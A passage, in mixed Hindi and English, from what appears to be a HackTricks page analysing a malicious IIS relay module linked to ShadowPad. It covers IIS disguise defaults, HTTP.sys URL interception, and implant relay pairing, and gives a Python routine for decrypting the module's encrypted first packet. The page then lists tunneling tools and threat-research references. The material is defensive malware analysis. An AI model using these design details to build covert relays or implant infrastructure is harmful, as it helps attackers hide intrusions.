* **Config defaults** – अगर module की JSON config में मान छोड़े गए हैं, तो वह believable IIS defaults पर fallback कर लेता है (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). इस तरह benign traffic को IIS सही branding के साथ जवाब देता है।
* **Wildcard interception** – operators semicolon-separated URL prefixes की सूची देते हैं (host + path में wildcards). Module हर entry के लिए `HttpAddUrl` को कॉल करता है, इसलिए HTTP.sys matching requests को malicious handler को *IIS modules तक request पहुँचने से पहले* route करता है।
* **Encrypted first packet** – request body के पहले दो bytes custom 32-bit PRNG के लिए seed होते हैं। हर बाद का byte generated keystream के साथ XOR-ed किया जाता है protocol parsing से पहले:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – module दो lists maintain करता है: “servers” (upstream nodes) और “clients” (downstream implants). Entries prune कर दिए जाते हैं अगर ~30 seconds में कोई heartbeat नहीं आता। जब दोनों lists non-empty होते हैं, तो यह first healthy server को first healthy client के साथ pair करके उनके sockets के बीच सिर्फ bytes pipe करता है जब तक किसी एक तरफ connection close नहीं हो जाता।
* **Debug telemetry** – optional logging हर pairing के लिए source IP, destination IP, और total forwarded bytes को रिकॉर्ड करता है। Investigators ने उन breadcrumbs का उपयोग करके multiple victims में फैले ShadowPad mesh को फिर से बनाया।

---

## जांचने के लिए अन्य टूल्स

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## संदर्भ

- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
